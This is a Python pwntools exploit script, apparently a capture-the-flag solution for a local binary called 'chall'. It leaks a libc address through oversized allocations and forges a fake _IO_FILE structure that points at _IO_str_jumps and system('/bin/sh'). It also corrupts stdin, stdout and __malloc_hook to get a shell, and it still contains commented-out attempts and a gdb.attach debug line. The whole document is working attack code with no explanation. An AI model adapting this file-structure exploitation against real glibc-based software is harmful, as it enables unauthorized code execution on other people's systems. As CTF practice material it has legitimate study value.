from pwn import *

p = process('./chall')
context.log_level = 'error'

def send(b,a=':'):
    p.sendlineafter(a,str(b),timeout=1) 
    
def create(alloc_size, write_size, data):
    send(1,'>')
    send(alloc_size)
    send(write_size)
    send(data)

create(0x200000, 0x5ed761, 'a')
#0x5ed761+0x200000 + 0x1000 + 0x10
create(0x200000, 0x7ee771, 'a')

t = p.readuntil(' / ')

leak = u64(t[9:17])
print hex(leak)

libc = ELF('./libc.so.6')
libc.address = leak-0x3ed8b0

stdout = libc.sym['_IO_2_1_stdout_']
stdin = libc.sym['_IO_2_1_stdin_']
io_str_jump = libc.address + 0x3e8360
bin_sh = next(libc.search('/bin/sh'))

fake  = p64(0xfbad1800) # original _flags & ~_IO_USER_BUF
fake += p64(0) * 6 # _IO_read_ptr to _IO_write_base
fake += p64(bin_sh) # _IO_write_end and _IO_buf_base
fake += p64(0) * 9 # _IO_save_base to _markers
fake += p64(libc.address+0x3ed8c0) # _lock
fake += p64(0)*9 # _codecvt
fake += p64(io_str_jump-0x28) # vtable
fake += p64(libc.sym['system'])*2 # _s._allocate_buffer
malloc_hook = libc.sym['__malloc_hook']

create(0x200000, 0x9eea29,fake)

p.send(p64(0xfbad208b) + p64(stdout+0xd8) + p64(0)*5 + p64(malloc_hook-8) + p64(malloc_hook+0x2000) + p64(0)*7 + '\x00'*4)
'''
fake = p64(0xfbad1800)
fake += p64(0)*4
fake += p64((bin_sh - 100)/2)
fake += p64(0)*2
fake += p64((bin_sh - 100)/2)
fake += p64(0)*8
fake += p64(libc.address+0x3ed8c0)
fake += p64(0)*9
fake += p64(io_str_jump)
fake += p64(libc.sym['system'])
fake += p64(stdout)
'''


#fake = p64(libc.address-0x603000+0x10)
fake = p64(0x31)
fake += p64(0xffffffffffffffff)

gdb.attach(p)
p.sendline(fake)






    
p.interactive()
